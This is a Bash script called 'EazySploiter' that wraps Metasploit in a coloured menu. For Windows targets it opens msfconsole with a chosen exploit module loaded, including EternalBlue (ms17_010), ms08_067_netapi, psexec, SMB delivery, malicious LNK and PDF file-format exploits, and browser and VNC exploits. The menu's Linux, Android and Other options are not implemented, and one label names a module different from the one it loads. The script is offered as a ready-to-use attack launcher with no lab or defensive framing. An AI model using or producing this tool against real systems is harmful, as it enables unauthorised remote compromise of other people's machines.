#! by unknwhp
clear
echo
echo
azul='\033[01;34m'
vermelho='\033[01;31m'
verde='\033[01;32m'
amarelo='\033[01;33m'
branco='\033[01;37m'
figlet 'EazySploiter'
echo
echo
service postgresql start
echo "  $amarelo [1]$branco Windows"
echo
echo "  $amarelo [2]$branco Linux"
echo
echo "  $amarelo [3]$branco Android"
echo
echo "  $amarelo [4]$branco Other"
echo
echo "  $amarelo [99]$branco Exit"
echo
echo
echo "$amarelo Select the target to exploit:"
echo -n "$verde eazy> $branco" && read target
echo
if [ $target -eq 1 ]
then
	clear
	echo
	echo "  $amarelo[1]$branco browser"
	echo
        echo "  $amarelo[2]$branco fileformat"
	echo
        echo "  $amarelo[3]$branco http"
	echo
        echo "  $amarelo[4]$branco smb"
	echo
        echo "  $amarelo[5]$branco vnc"
	echo
        echo "$amarelo Select a host:"
	echo -n "$verde windows>  $branco" && read wintarget 
	if [ $wintarget -eq 1 ]
	then
		clear
		echo
	        echo "  $amarelo[1]$branco adobe_flash_regex_value"
	        echo
	        echo "  $amarelo[2]$branco autodesk_idrop"
	        echo
	        echo "  $amarelo[3]$branco firefox_smil_uaf"
	        echo
	        echo "  $amarelo[4]$branco ie_unsafe_scripting"
	        echo
	        echo "  $amarelo[5]$branco ms16_051_vbscript"
	        echo
		echo "$amarelo Select a exploit:"
		echo -n "$verde windows/browser> $branco" && read winbrowser
		if [ $winbrowser -eq 1 ]
		then
			msfconsole -x 'use exploit/windows/browser/adobe_flash_regex_value; options'
		elif [ $winbrowser -eq 2 ]
                then
                        msfconsole -x 'use exploit/windows/browser/autodesk_idrop; options;'
		elif [ $winbrowser -eq 3 ]
                then
                        msfconsole -x 'use exploit/windows/browser/firefox_smil_uaf; options;'
		elif [ $winbrowser -eq 4 ]
                then
                        msfconsole -x 'use exploit/windows/browser/ie_unsafe_scripting; options;'
		elif [ $winbrowser -eq 5 ]
                then
                        msfconsole -x 'use exploit/windows/browser/ms16_051_vbscript; options;'

		fi
	elif [ $wintarget -eq 2 ]
        then
		clear
                echo
                echo "  $amarelo[1]$branco adobe_pdf_embedded_exe"
                echo
                echo "  $amarelo[2]$branco ms15_020_shortcut_icon_dllloader"
                echo
                echo "  $amarelo[3]$branco vlc_smb_uri"
                echo
                echo "  $amarelo[4]$branco wireshark_mpeg_overflow"
                echo
                echo "  $amarelo[5]$branco cve_2017_8464_lnk_rce"
                echo
                echo "$amarelo Select a exploit:"
                echo -n "$verde windows/fileformat> $branco" && read winformat
		if [ $winformat -eq 1 ]
                then
                        msfconsole -x 'use exploit/windows/fileformat/adobe_pdf_embedded_exe; options'
		elif [ $winformat -eq 2 ]
                then
                        msfconsole -x 'use exploit/windows/fileformat/ms15_020_shortcut_icon_dllloader; options'
		elif [ $winformat -eq 3 ]
                then
                        msfconsole -x 'use exploit/windows/fileformat/vlc_smb_uri; options'
		elif [ $winformat -eq 4 ]
                then
                        msfconsole -x 'use exploit/windows/fileformat/wireshark_mpeg_overflow; options'
		elif [ $winformat -eq 5 ]
                then
                        msfconsole -x 'use exploit/windows/fileformat/cve_2017_8464_lnk_rce; options'
		fi
	elif [ $wintarget -eq 3 ]
	then
		clear
		echo
                echo "  $amarelo[1]$branco apache_chunked"
                echo
                echo "  $amarelo[2]$branco badblue_passthru"
                echo
                echo "  $amarelo[3]$branco hp_autopass_license_traversal"
                echo
                echo "  $amarelo[4]$branco xampp_webdav_upload_php"
                echo
                echo "$amarelo Select a exploit:"
                echo -n "$verde windows/http> $branco" && read winhttp
		if [ $winhttp -eq 1 ]
		then
			msfconsole -x 'use exploit/windows/http/apache_chunked; options'
		elif [ $winhttp -eq 2 ]
                then
                        msfconsole -x 'use exploit/windows/http/badblue_passthru; options'
		elif [ $winhttp -eq 3 ]
                then
                        msfconsole -x 'use exploit/windows/http/hp_autopass_license_traversal; options'
		elif [ $winhttp -eq 4 ]
                then
                        msfconsole -x 'use exploit/windows/http/xampp_webdav_upload_php; options'
		fi
	elif [ $wintarget -eq 4 ]
        then
		clear
                echo
                echo "  $amarelo[1]$branco smb_delivery"
                echo
                echo "  $amarelo[2]$branco psexec"
                echo
                echo "  $amarelo[3]$branco ms17_010_eternalblue"
                echo
                echo "  $amarelo[4]$branco ms08_067_netapi"
                echo
		echo "  $amarelo[5]$branco ms15_010_shortcut_icon_dllloader"
		echo
                echo "$amarelo Select a exploit:"
                echo -n "$verde windows/smb> $branco" && read winsmb
		if [ $winsmb -eq 1 ]
		then
			msfconsole -x 'use exploit/windows/smb/smb_delivery; options'
		elif [ $winsmb -eq 2 ]
		then
			msfconsole -x 'use exploit/windows/smb/psexec; options'
		elif [ $winsmb -eq 3 ]
                then
                        msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; options'
		elif [ $winsmb -eq 4 ]
                then
                        msfconsole -x 'use exploit/windows/smb/ms08_067_netapi; options'
		elif [ $winsmb -eq 5 ]
                then
                        msfconsole -x 'use exploit/windows/smb/ms15_020_shortcut_icon_dllloader; options'
		fi
	elif [ $wintarget -eq 5 ]
        then
		clear
                echo
                echo "  $amarelo[1]$branco realvnc_client"
                echo
                echo "  $amarelo[2]$branco ultravnc_client"
                echo
                echo "  $amarelo[3]$branco winvnc_http_get"
                echo
                echo "  $amarelo[4]$branco ultravnc_viewer_bof"
                echo
                echo "$amarelo Select a exploit:"
                echo -n "$verde windows/vnc> $branco" && read winvnc
		if [ $winvnc -eq 1 ]
                then
                        msfconsole -x 'use exploit/windows/vnc/realvnc_client; options'
		elif [ $winvnc -eq 2 ]
                then
			msfconsole -x 'use exploit/windows/vnc/ultravnc_client; options'
		elif [ $winvnc -eq 3 ]
                then
                        msfconsole -x 'use exploit/windows/vnc/winvnc_http_get; options'
		elif [ $winvnc -eq 4 ]
                then
                        msfconsole -x 'use exploit/windows/vnc/ultravnc_viewer_bof; options'
		fi
	fi
 fi
